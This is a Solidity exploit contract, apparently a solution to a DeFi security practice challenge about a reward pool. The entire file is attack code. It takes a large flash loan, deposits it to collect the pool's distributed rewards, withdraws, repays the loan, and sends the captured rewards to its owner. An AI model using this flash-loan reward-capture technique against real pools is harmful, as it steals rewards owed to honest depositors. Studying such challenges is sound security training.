pragma solidity ^0.6.0;

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function withdraw(uint256 amountToWithdraw) external;

    function deposit(uint256 amountToDeposit) external;

    function distributeRewards() external returns (uint256);
}

interface IERC20Stub {
    function transfer(address to, uint256 amount) external;

    function approve(address who, uint256 amount) external;

    function balanceOf(address who) external view returns (uint256);
}

contract HackTheRewarderPool {
    IFlashLoanerPool flashLoanContract;
    ITheRewarderPool poolContract;
    IERC20Stub liquidityToken;
    IERC20Stub rewardToken;

    address owner;

    constructor(
        address _flashLoanContract,
        address _poolContract,
        address _liquidityToken,
        address _rewardToken
    ) public {
        owner = msg.sender;
        flashLoanContract = IFlashLoanerPool(_flashLoanContract);
        poolContract = ITheRewarderPool(_poolContract);
        liquidityToken = IERC20Stub(_liquidityToken);
        rewardToken = IERC20Stub(_rewardToken);
    }

    function hackit() public {
        require(msg.sender == owner, "only owner");
        flashLoanContract.flashLoan(1000000 ether);
    }

    function withdraw() public {
        require(msg.sender == owner, "only owner");
        uint256 rewards = rewardToken.balanceOf(address(this));
        rewardToken.transfer(msg.sender, rewards);
    }

    function receiveFlashLoan(uint256 _amount) external {
        liquidityToken.approve(address(poolContract), _amount);
        poolContract.deposit(_amount);
        require(
            rewardToken.balanceOf(address(this)) > 0,
            "hack not successful"
        );
        poolContract.withdraw(_amount);
        liquidityToken.transfer(address(flashLoanContract), _amount);
    }
}
